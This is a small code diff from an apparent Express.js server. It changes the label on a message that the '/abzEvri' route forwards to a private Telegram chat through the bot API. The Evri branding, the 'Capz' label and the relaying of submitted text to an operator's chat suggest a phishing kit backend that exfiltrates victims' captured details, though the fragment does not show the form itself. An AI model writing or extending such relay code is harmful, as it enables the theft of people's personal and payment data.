@@ -8219,7 +8219,7 @@ app.post("/abzEvri", (req, res) => {
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
               chat_id: 680379375,
-              text: `EvriCapz:\n${originalText}`,
+              text: `EvriAbz:\n${originalText}`,
               parse_mode: "Markdown",
             }
           )
